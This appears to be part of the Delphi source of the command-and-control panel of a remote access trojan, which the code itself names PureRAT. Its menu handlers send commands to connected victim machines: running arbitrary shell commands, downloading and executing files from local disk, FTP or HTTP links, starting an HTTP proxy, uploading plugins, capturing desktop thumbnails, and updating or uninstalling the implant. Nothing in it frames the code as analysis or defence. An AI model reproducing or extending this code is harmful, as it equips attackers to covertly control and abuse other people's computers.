      if ConnDatas.Forms[14] <> nil then TFormScripts(ConnDatas.Forms[14]).Show else
      begin
        TmpForm := TFormScripts.Create(Self, ConnDatas);
        ConnDatas.Forms[14] := TmpForm;
        TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
          ConnDatas.ConnInfos.User_Computer + ']';
        TmpForm.Show;
      end;
    end;
  end;
end;

procedure TFormMain.P1Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpStr: string;
  i: Integer;
begin
  P1.Checked := not P1.Checked;

  if P1.Checked then
  begin
    if lvConnections.Items[i].SubItems[10] = 'No' then
    begin
      MessageBox(Handle, 'Plugin is missing on remote machine. Please upload plugin first.',
              PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
              MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
      Exit;
    end;

    if not InputQuery(PROGRAMNAME + ' ' + PROGRAMVERSION, 'Http proxy port', TmpStr) then
    begin
      P1.Checked := False;
      Exit;
    end;

    if lvConnections.SelCount = 1 then
    begin
      i := GetClientIndex;
      if i = -1 then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      SendDatas(ConnDatas.AThread, PROXYSTART + '|' + TmpStr);
    end
    else
    begin
      for i:=0 to ConnectionList.Count-1 do
      begin
        if not lvConnections.Items[i].Selected then Exit;
        ConnDatas := PConnectionDatas(ConnectionList[i]);
        if ConnDatas.Items = nil then Exit;
        SendDatas(ConnDatas.AThread, PROXYSTART + '|' + TmpStr);
      end;
    end;
  end
  else
  begin
    if lvConnections.SelCount = 1 then
    begin
      i := GetClientIndex;
      if i = -1 then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      SendDatas(ConnDatas.AThread, PROXYSTOP + '|');
    end
    else
    begin
      for i:=0 to ConnectionList.Count-1 do
      begin
        if not lvConnections.Items[i].Selected then Exit;
        ConnDatas := PConnectionDatas(ConnectionList[i]);
        if ConnDatas.Items = nil then Exit;
        SendDatas(ConnDatas.AThread, PROXYSTOP + '|');
      end;
    end;
  end;
end;

procedure TFormMain.E4Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpStr: string;
  i: Integer;
begin
  if not InputQuery(PROGRAMNAME + ' ' + PROGRAMVERSION, 'Shell command', TmpStr) then Exit;

  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    SendDatas(ConnDatas.AThread, EXECUTESHELLCOMMAND + '|' + TmpStr);
  end
  else
  begin
    for i := 0 to ConnectionList.Count - 1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      SendDatas(ConnDatas.AThread, EXECUTESHELLCOMMAND + '|' + TmpStr);
    end;
  end;
end;

procedure TFormMain.F5Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  i: Integer;
begin
  dlgOpen1.Title := PROGRAMNAME + ' ' + PROGRAMVERSION;
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := '(*.*)|*.*';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    SendDatas(ConnDatas.AThread, FILESEXECUTEFROMLOCAL + '|' +
              dlgOpen1.FileName + '|' + IntToStr(MyGetFileSize(dlgOpen1.FileName)) + '|');
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      SendDatas(ConnDatas.AThread, FILESEXECUTEFROMLOCAL + '|' +
                dlgOpen1.FileName + '|' + IntToStr(MyGetFileSize(dlgOpen1.FileName)) + '|');
    end;
  end;
end;

procedure TFormMain.F7Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpForm: TFormFTPManager;
  i: Integer;
begin
  TmpForm := TFormFTPManager.Create(Application);
  TmpForm.edtFtphost.Text := FtpHost;
  TmpForm.edtFtpUser.Text := FtpUser;
  TmpForm.edtFtpPass.Text := FtpPass;
  TmpForm.edtFtpDir.Text := FtpDir;
  TmpForm.edtFilename.Text := FtpFilename;
  TmpForm.seFtpPort.Value := FtpPort;

  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  FtpHost := TmpForm.edtFtphost.Text;
  FtpUser := TmpForm.edtFtpUser.Text;
  FtpPass :=TmpForm.edtFtpPass.Text;
  FtpDir := TmpForm.edtFtpDir.Text;
  FtpFilename := TmpForm.edtFilename.Text;
  FtpPort := TmpForm.seFtpPort.Value;

  if (FtpHost = '') or (FtpUser = '') or (FtpPass = '') or
    (FtpDir = '') or (FtpFilename = '')
  then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    SendDatas(ConnDatas.AThread, FILESEXECUTEFROMFTP + '|' +
              FtpHost + '|' + FtpUser + '|' + FtpPass + '|' + FtpDir + '|' +
              FtpFilename + '|' + IntToStr(FtpPort));
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      SendDatas(ConnDatas.AThread, FILESEXECUTEFROMFTP + '|' +
                FtpHost + '|' + FtpUser + '|' + FtpPass + '|' + FtpDir + '|' +
                FtpFilename + '|' + IntToStr(FtpPort));
    end;
  end;
  
  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormMain.F6Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpStr: string;
  i: Integer;
begin
  if not InputQuery(PROGRAMNAME + ' ' + PROGRAMVERSION, 'Http link', TmpStr) then Exit;

  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    SendDatas(ConnDatas.AThread, FILESEXECUTEFROMLINK + '|' + TmpStr);
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      SendDatas(ConnDatas.AThread, FILESEXECUTEFROMLINK + '|' + TmpStr);
    end;
  end;
end;

procedure TFormMain.P5Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    SendDatas(ConnDatas.AThread, PING + '|');
    ConnDatas.Ping := GetTickCount;
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      SendDatas(ConnDatas.AThread, PING + '|');
      ConnDatas.Ping := GetTickCount;
    end;
  end;
end;

procedure TFormMain.U5Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  Pluginfile, TmpStr: string;
  TmpHandle: THandle;
  i: Integer;
  PluginInfos: function(): PChar; stdcall;
begin
  {$IFDEF TRIAL}
    MessageBox(Handle, 'Not allowed in trial version.',
              PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
              MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    Exit;
  {$ENDIF}
           
  Pluginfile := ExtractFilePath(ParamStr(0)) + 'Plugin\plugin.dll';

  if not FileExists(Pluginfile) then
  begin
    MessageBox(Handle, PChar('Plugin file "' + Pluginfile + '" not found.'),
              PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
              MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    Exit;
  end;

  TmpHandle := LoadLibrary(PChar(Pluginfile));
  @PluginInfos := GetProcAddress(TmpHandle, 'PluginInfos');
  if not Assigned(PluginInfos) then
  begin
    MessageBox(Handle, PChar('Failed to check plugin informations.'),
              PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
              MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    Exit;
  end;

  TmpStr := PluginInfos;
  if TmpStr <> PROGRAMNAME + ' ' + PROGRAMVERSION + ' by ' + PROGRAMAUTHOR then
  begin
    MessageBox(Handle, PChar('This plugin file is not a valid PureRAT plugin.'),
              PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
              MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    Exit;
  end;

  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    SendDatas(ConnDatas.AThread, PLUGINSUPLOAD + '|' +
              Pluginfile + '|' + IntToStr(MyGetFileSize(Pluginfile)) + '|');
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      SendDatas(ConnDatas.AThread, PLUGINSUPLOAD + '|' +
                Pluginfile + '|' + IntToStr(MyGetFileSize(Pluginfile)) + '|');
    end;
  end;
end;

procedure TFormMain.D3Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  Pluginfile: string;
  i: Integer;
begin
  if DeskThumb = False then Exit;
  
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    SendDatas(ConnDatas.AThread, DESKTOPTHUMBNAIL + '|' +
              IntToStr(ThumbWidth) + '|' + IntToStr(ThumbHeight));
  end
  else
  begin
    for i := 0 to ConnectionList.Count - 1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      SendDatas(ConnDatas.AThread, DESKTOPTHUMBNAIL + '|' +
              IntToStr(ThumbWidth) + '|' + IntToStr(ThumbHeight));
    end;
  end;
end;

procedure TFormMain.R3Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpStr: string;
  i: Integer;
begin
  if not InputQuery(PROGRAMNAME + ' ' + PROGRAMVERSION, 'New client id', TmpStr) then Exit;

  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    SendDatas(ConnDatas.AThread, CLIENTRENAME + '|' + TmpStr);
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      SendDatas(ConnDatas.AThread, CLIENTRENAME + '|' + TmpStr);
    end;
  end;
end;

procedure TFormMain.R4Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    SendDatas(ConnDatas.AThread, CLIENTRESTART + '|');
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      SendDatas(ConnDatas.AThread, CLIENTRESTART + '|');
    end;
  end;
end;

procedure TFormMain.C6Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    SendDatas(ConnDatas.AThread, CLIENTCLOSE + '|');
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      SendDatas(ConnDatas.AThread, CLIENTCLOSE + '|');
    end;
  end;
end;

procedure TFormMain.U3Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  i: Integer;
begin
  if MessageBox(Handle,
                PChar('Are you sure you want to uninstall selected client(s)?'),
                PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                MB_YESNOCANCEL or MB_ICONWARNING or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> IDYES then Exit;

  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    SendDatas(ConnDatas.AThread, CLIENTREMOVE + '|');
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      SendDatas(ConnDatas.AThread, CLIENTREMOVE + '|');
    end;
  end;
end;

procedure TFormMain.F2Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  i: Integer;
begin
  dlgOpen1.Title := PROGRAMNAME + ' ' + PROGRAMVERSION;
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := 'PureRAT client(*.exe)|*.exe';
  dlgOpen1.DefaultExt := 'exe';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    SendDatas(ConnDatas.AThread, CLIENTUPDATEFROMLOCAL + '|' +
              dlgOpen1.FileName + '|' + IntToStr(MyGetFileSize(dlgOpen1.FileName)) + '|');
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      SendDatas(ConnDatas.AThread, CLIENTUPDATEFROMLOCAL + '|' +
                dlgOpen1.FileName + '|' + IntToStr(MyGetFileSize(dlgOpen1.FileName)) + '|');
    end;
  end;
end;

procedure TFormMain.F8Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpForm: TFormFTPManager;
  i: Integer;
begin
  TmpForm := TFormFTPManager.Create(Application);
  TmpForm.edtFtphost.Text := FtpHost;
  TmpForm.edtFtpUser.Text := FtpUser;
  TmpForm.edtFtpPass.Text := FtpPass;
  TmpForm.edtFtpDir.Text := FtpDir;
  TmpForm.edtFilename.Text := FtpFilename;
  TmpForm.seFtpPort.Value := FtpPort;

  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  FtpHost := TmpForm.edtFtphost.Text;
  FtpUser := TmpForm.edtFtpUser.Text;
  FtpPass :=TmpForm.edtFtpPass.Text;
  FtpDir := TmpForm.edtFtpDir.Text;
  FtpFilename := TmpForm.edtFilename.Text;
  FtpPort := TmpForm.seFtpPort.Value;

  if (FtpHost = '') or (FtpUser = '') or (FtpPass = '') or
    (FtpDir = '') or (FtpFilename = '')
  then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    SendDatas(ConnDatas.AThread, CLIENTUPDATEFROMFTP + '|' +
              FtpHost + '|' + FtpUser + '|' + FtpPass + '|' + FtpDir + '|' +
              FtpFilename + '|' + IntToStr(FtpPort));
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      SendDatas(ConnDatas.AThread, CLIENTUPDATEFROMFTP + '|' +
                FtpHost + '|' + FtpUser + '|' + FtpPass + '|' + FtpDir + '|' +
                FtpFilename + '|' + IntToStr(FtpPort));
    end;
  end;

  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormMain.F3Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpStr: string;
  i: Integer;
begin
  if not InputQuery(PROGRAMNAME + ' ' + PROGRAMVERSION, 'Http link', TmpStr) then Exit;

  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    SendDatas(ConnDatas.AThread, CLIENTUPDATEFROMLINK + '|' + TmpStr);
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      SendDatas(ConnDatas.AThread, CLIENTUPDATEFROMLINK + '|' + TmpStr);
    end;
  end;
end;

procedure TFormMain.O1Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpStr: string;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    TmpStr := GetUserFolder(ConnDatas.Identification);
    ShellExecute(Handle, 'open', PChar(TmpStr), nil, nil, SW_SHOWNORMAL);
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      TmpStr := GetUserFolder(ConnDatas.Identification);
      ShellExecute(Handle, 'open', PChar(TmpStr), nil, nil, SW_SHOWNORMAL);
    end;
  end;
end;

end.
